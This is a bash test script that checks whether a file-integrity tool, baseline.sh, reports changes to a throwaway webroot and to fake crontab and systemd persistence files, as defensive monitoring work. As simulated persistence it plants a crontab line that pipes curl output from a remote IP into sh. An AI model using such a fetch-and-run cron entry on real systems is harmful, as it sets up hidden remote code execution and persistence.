#!/bin/bash
# =============================================================================
#  test-baseline.sh -- prove baseline.sh reports every kind of change, in the
#  right group, and nothing it should not
#
#  Builds a throwaway webroot and a fake persistence file, takes a baseline,
#  makes one change of each kind, and checks the comparison names each one.
#  A drift check that misses a change is worse than none: it is the thing
#  people stop looking past once it has been quiet for a week.
#
#  Usage:  bash tools/test-baseline.sh
#    exit 0 PASS   exit 1 FAIL   exit 2 INCONCLUSIVE (could not build the lab)
# =============================================================================

set -u
HERE=$(cd "$(dirname "$0")/.." && pwd)
B="$HERE/tools/baseline.sh"
[ -f "$B" ] || { echo "INCONCLUSIVE -- cannot find $B"; exit 2; }

LAB=$(mktemp -d) || { echo "INCONCLUSIVE -- mktemp failed"; exit 2; }
trap 'rm -rf "$LAB"' EXIT INT TERM HUP
W="$LAB/www/site"; ST="$LAB/state"; P="$LAB/persist"
mkdir -p "$W/wp-content/uploads" "$W/cache/sub" "$W/img" "$P" || { echo "INCONCLUSIVE"; exit 2; }
printf '<?php echo "home";\n'   > "$W/index.php"
printf '<?php echo "keep";\n'   > "$W/keep.php"
printf '<?php echo "gone";\n'   > "$W/gone.php"
printf '<?php echo "perm";\n'   > "$W/perm.php"
printf 'RewriteEngine On\n'      > "$W/.htaccess"
printf 'PNG\n'                   > "$W/img/logo.png"
printf '<html>cached</html>\n'   > "$W/cache/sub/page.html"
printf '0 3 * * * true\n'        > "$P/crontab"
mkdir -p "$P/units/multi-user.target.wants"
printf '[Service]\nExecStart=/bin/true\n' > "$P/units/ok.service"
ln -s ../ok.service "$P/units/multi-user.target.wants/ok.service"
chmod 644 "$W/perm.php"
export IR_BASELINE_EXTRA="$P/crontab $P/units"   # keep the real /etc out of the test

FAIL=0
ok()   { echo "  ok      $1"; }
bad()  { echo "  FAIL    $1"; FAIL=1; }
expect_rc() {  # $1 description, $2 expected, $3 actual
  [ "$2" = "$3" ] && ok "$1 (exit $3)" || bad "$1 -- expected exit $2, got $3"
}

echo "-- before any baseline --"
bash "$B" compare --state "$ST" > "$LAB/out0" 2>&1; expect_rc "compare without a baseline refuses" 2 $?

echo "-- take, then compare with nothing changed --"
bash "$B" take --root "$W" --state "$ST" > "$LAB/out1" 2>&1; expect_rc "take" 0 $?
[ "$(stat -c %a "$ST")" = "700" ] && ok "state directory is root-only (700)" || bad "state directory mode is $(stat -c %a "$ST")"
bash "$B" compare --state "$ST" > "$LAB/out2" 2>&1; expect_rc "compare, unchanged" 0 $?
grep -q '^no change' "$LAB/out2" && ok "says no change" || bad "unchanged run did not say 'no change'"

echo "-- one change of each kind --"
echo '// edited' >> "$W/index.php"
printf '<?php exit; // dropped\n' > "$W/wp-content/uploads/x.php"
printf '<?php exit; // hidden two levels into a cache dir\n' > "$W/cache/sub/evil.php"
printf 'more cache\n' > "$W/cache/sub/junk.html"
printf 'PNG2\n' > "$W/img/new.png"
rm -f "$W/gone.php"
chmod 600 "$W/perm.php"
echo 'RewriteRule ^x$ /y [L]' >> "$W/.htaccess"
echo '*/5 * * * * curl -s http://203.0.113.9/x | sh' >> "$P/crontab"
ln -s /lib/systemd/system/vendor.service "$P/units/multi-user.target.wants/vendor.service"
ln -sf ../other.service "$P/units/multi-user.target.wants/ok.service"
bash "$B" compare --state "$ST" > "$LAB/out3" 2>&1; expect_rc "compare, changed" 1 $?
HOT=$(sed -n '/^== changes to PHP/,/^== other changes/p' "$LAB/out3")
OTHER=$(sed -n '/^== other changes/,$p' "$LAB/out3")
has() {  # $1 description, $2 haystack, $3 needle
  printf '%s\n' "$2" | grep -qF -- "$3" && ok "$1" || { bad "$1 -- expected: $3"; }
}
has "modified PHP, in the hot group"            "$HOT"   "MODIFIED  $W/index.php"
has "new PHP in uploads, hot"                   "$HOT"   "NEW       $W/wp-content/uploads/x.php"
has "new PHP under cache/sub/, hot"             "$HOT"   "NEW       $W/cache/sub/evil.php"
has "removed PHP, hot"                          "$HOT"   "REMOVED   $W/gone.php"
has "permission change, hot"                    "$HOT"   "PERMS     $W/perm.php"
has "modified .htaccess, hot"                   "$HOT"   "MODIFIED  $W/.htaccess"
has "modified crontab (persistence), hot"       "$HOT"   "MODIFIED  $P/crontab"
has "unit enabled by a new symlink, hot"        "$HOT"   "NEW       $P/units/multi-user.target.wants/vendor.service"
has "symlink retargeted, hot"                   "$HOT"   "MODIFIED  $P/units/multi-user.target.wants/ok.service"
has "new image, in the other group"             "$OTHER" "NEW       $W/img/new.png"
grep -qF "junk.html" "$LAB/out3" && bad "churn in a cache dir was reported" || ok "non-PHP churn in cache/ ignored"
grep -qF "keep.php" "$LAB/out3" && bad "an unchanged file was reported" || ok "unchanged files not reported"

echo "-- --quiet after a fresh baseline --"
bash "$B" take --root "$W" --state "$ST" > /dev/null 2>&1
bash "$B" compare --state "$ST" --quiet > "$LAB/out4" 2>&1; expect_rc "quiet compare, unchanged" 0 $?
[ -s "$LAB/out4" ] && bad "--quiet printed output with nothing changed" || ok "--quiet prints nothing"

echo "-- webroots from a scanner report --"
printf 'webroots to scan (1):\n  %s\n\n== more ==\n' "$W" > "$LAB/report.txt"
bash "$B" take --report "$LAB/report.txt" --state "$LAB/state2" > /dev/null 2>&1; expect_rc "take --report" 0 $?
grep -qxF "$W" "$LAB/state2/roots" 2>/dev/null && ok "root read from the report" || bad "root not read from the report"

echo
if [ "$FAIL" = "1" ]; then
  echo "FAIL -- see above. Comparison output:"; sed 's/^/  | /' "$LAB/out3"; exit 1
fi
echo "PASS -- every kind of change reported in the right group; churn and unchanged files not"
exit 0
